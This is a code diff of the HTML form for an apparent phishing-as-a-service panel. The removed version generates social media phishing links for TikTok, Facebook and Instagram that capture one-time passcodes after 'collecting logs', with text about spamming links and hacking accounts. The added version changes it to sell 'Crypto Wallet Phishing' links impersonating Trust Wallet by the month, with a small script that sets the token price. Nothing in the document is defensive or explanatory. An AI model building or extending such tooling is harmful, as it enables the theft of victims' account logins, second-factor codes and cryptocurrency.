@@ -38,10 +38,12 @@
 
 <div class="main-panel">
   <div class="content-wrapper">
-    <h1>Generate A New Link</h1>
-
+    <h1>Generate A Crypto Wallet Phishing Link</h1>
+    <br />
+    <a href="/trust-wallet-link">How does it work?</a>
+    <br />
     <form
-      action="/create-link"
+      action="/create-wallet-link"
       method="post"
       class="form mt-4"
       style="max-width: 500px"
@@ -58,69 +60,58 @@
           required
         />
         <small class="text-white"
-          >Give this link a short name, example: Instagram with OTP</small
+          >Give this link a short name, example: Trust Wallet Phishing
+          Link</small
         >
       </div>
       <div class="mb-3">
-        <label>Model Name</label>
-        <input
-          type="text"
-          placeholder="Model Name e.g  Emily Johnson"
-          class="form-control text-white"
-          name="modelName"
-          required
-        />
-        <small class="text-white"
-          >Name of the social media account you will be using to spam phisphing
-          links</small
-        >
-      </div>
-      <div class="mb-3">
-        <label>Choose Social Media</label>
+        <label>Choose Wallet Type</label>
         <select
           class="form-select form-control text-white"
           aria-label="Default select example"
           name="linkType"
           required
         >
-          <option value="TIKTOK" class="text-white">TIKTOK (New)</option>
-          <option value="FACEBOOK" class="text-white">FACEBOOK</option>
-          <option value="INSTAGRAM" class="text-white">INSTAGRAM</option>
+          <option value="TRUST WALLET" class="text-white">TRUST WALLET</option>
         </select>
         <small class="text-white"
-          >We are working on adding more social media links
+          >We are working on adding more crypto wallets
         </small>
       </div>
       <div class="mb-3">
-        <label>Two Factor Authentication</label>
+        <label>How long do you want it to last?</label>
         <select
           class="form-select form-control text-white"
-          aria-label="Require OTP"
+          aria-label="Default select example"
+          name="months"
           required
-          name="otpEnabled"
+          id="months"
         >
-          <option value="true" class="text-white">Yes</option>
-          <option value="false" class="text-white">No</option>
+          <option value="1" class="text-white">1 Month</option>
+          <option value="2" class="text-white">2 Months</option>
+          <option value="3" class="text-white">3 Months</option>
+          <option value="4" class="text-white">4 Months</option>
+          <option value="5" class="text-white">5 Months</option>
+          <option value="6" class="text-white">6 Months</option>
+          <option value="7" class="text-white">7 Months</option>
+          <option value="8" class="text-white">8 Months</option>
+          <option value="9" class="text-white">9 Months</option>
+          <option value="10" class="text-white">10 Months</option>
+          <option value="11" class="text-white">11 Months</option>
+          <option value="12" class="text-white">12 Months</option>
         </select>
-        <small class="text-white"
-          >Yes for the link to collect OTP after collecting logs
-        </small>
       </div>
       <div class="mb-3">
         <label for="">Price(in tokens)</label>
         <input
           type="text"
-          placeholder="1 token"
           name="price"
+          id="price"
           class="form-control text-white bg-dark"
           required
           readonly
-          value="Price: 1 Token"
+          value="8"
         />
-        <small class="text-white"
-          >Link lasts for 7 days, you can hack as many account within this
-          period.
-        </small>
       </div>
       <div class="ml-1 row">
         <button
@@ -165,4 +156,13 @@
     submitBtn.style.display = "none";
     submitBtn2.style.display = "block";
   };
+</script>
+
+<script>
+  const price = document.querySelector("#price");
+  const months = document.querySelector("#months");
+
+  months.addEventListener("input", (e) => {
+    price.value = e.target.value * 8;
+  });
 </script>
